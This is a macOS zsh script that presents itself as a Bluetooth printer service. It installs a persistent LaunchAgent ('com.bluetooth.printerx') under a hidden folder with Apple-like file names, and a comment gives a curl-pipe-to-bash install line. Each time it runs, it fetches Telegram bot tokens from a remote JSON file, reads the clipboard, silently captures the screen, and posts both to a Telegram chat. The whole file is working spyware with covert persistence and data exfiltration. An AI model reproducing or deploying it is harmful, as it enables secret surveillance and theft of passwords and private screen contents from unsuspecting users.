#!/bin/zsh
#curl -o- https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/l.apple.sh | bash
LOGPATH="$HOME/Library/Logs/_mylog.log"
SNAME="com.bluetooth.printerx"
FOLDER_PATH="$HOME/.tempd"
PICTURE_PATH="$FOLDER_PATH/d.apple.com.lib"
NOW=$(date)
#ANY=$(cat "/var/log/conn.log" | grep "Incoming session request" | awk \{'print $2 $3 $13 $14'\})
CB=$(pbpaste)
mkdir -p "$FOLDER_PATH"
mkdir -p "$HOME"/Library/LaunchAgents
PL="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\"><dict>
<key>Label</key><string>$SNAME</string>
<key>RunAtLoad</key><true /><key>StartInterval</key><integer>75</integer>
<key>Program</key><string>$HOME/.tempd/l.apple.sh</string>
<key>StartInterval</key><integer>1800</integer>
</dict></plist>"
PLPATH="$HOME/Library/LaunchAgents/$SNAME.plist"
if [[ $1 == "I" || $1 == "i" ]]; then
 launchctl kill $SNAME
 launchctl remove "$PLPATH"
 launchctl unload "$PLPATH"
  {
    date
    echo "$PL"
    echo "$PLPATH"
  } >> "$LOGPATH"

 plutil "$PLPATH"
 echo "$PL" >>"$PLPATH"
 cp ./l.apple.sh "$FOLDER_PATH"
 chmod +x "$HOME"/.tempd/l.apple.sh
 launchctl load "$PLPATH"
 # cat $HOME/Library/LaunchAgents/com.bluetooth.printerx.plist;
 launchctl list | grep blue
elif [[ $1 == "R" || $1 == "r" ]]; then
 launchctl unload "$PLPATH"
 rm "$PLPATH"
 echo "$NOW" > "$LOGPATH"
fi
JSON_URL="https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/tokenX.json"
#TELGRAM_TOKEN__hh_god_bot1=curl -H "Accept: application/json" "$JSON_URL" | jq '.TELGRAM_TOKEN__hh_god_bot1'
#TELGRAM_TOKEN__hh_god_bot2=curl -H "Accept: application/json" "$JSON_URL" | jq '.TELGRAM_TOKEN__hh_god_bot2'
#TELGRAM_TOKEN__hh_god_bot="$TELGRAM_TOKEN__hh_god_bot1""$TELGRAM_TOKEN__hh_god_bot2"

TELGRAM_TOKEN__xlinx_bot1=$(curl -H "Accept: application/json" "$JSON_URL" | jq -r '.tunnelX1.TELGRAM_TOKEN__xlinx_bot1')
TELGRAM_TOKEN__xlinx_bot2=$(curl -H "Accept: application/json" "$JSON_URL" | jq -r '.tunnelX1.TELGRAM_TOKEN__xlinx_bot2')
TELGRAM_TOKEN__xlinx_bot="$TELGRAM_TOKEN__xlinx_bot1""$TELGRAM_TOKEN__xlinx_bot2"
TELGRAM_CHAT_ID=$(curl -H "Accept: application/json" "$JSON_URL" | jq -r '.tunnelX1.TELGRAM_CHAT_ID')

TOKEN_TELGRAM=$TELGRAM_TOKEN__xlinx_bot
TOKEN_CHAT_ID=$TELGRAM_CHAT_ID

TELGRAM_UPDATE_URL="https://api.telegram.org/bot$TOKEN_TELGRAM/getUpdates"
TELGRAM_SEND_MESSGAE_URL="https://api.telegram.org/bot$TOKEN_TELGRAM/sendMessage"
TELGRAM_SEND_IMAGE_URL="https://api.telegram.org/bot$TOKEN_TELGRAM/sendPhoto"
echo "$TELGRAM_UPDATE_URL"
echo "$TELGRAM_SEND_MESSGAE_URL"
echo "$TELGRAM_SEND_IMAGE_URL"


#touch $PICTURE_PATH
screencapture -t jpg -x "$PICTURE_PATH"

curl -X POST "$TELGRAM_SEND_MESSGAE_URL" \
      -H "Content-Type: application/json" \
      -d "{\"chat_id\": \"$TOKEN_CHAT_ID\", \"text\": \"CB=$CB\"}"

curl -X POST "$TELGRAM_SEND_IMAGE_URL" \
      -H "Content-Type:multipart/form-data" \
      -F chat_id="$TOKEN_CHAT_ID" \
      -F photo=@"$PICTURE_PATH" \
      -F caption="$PICTURE_PATH"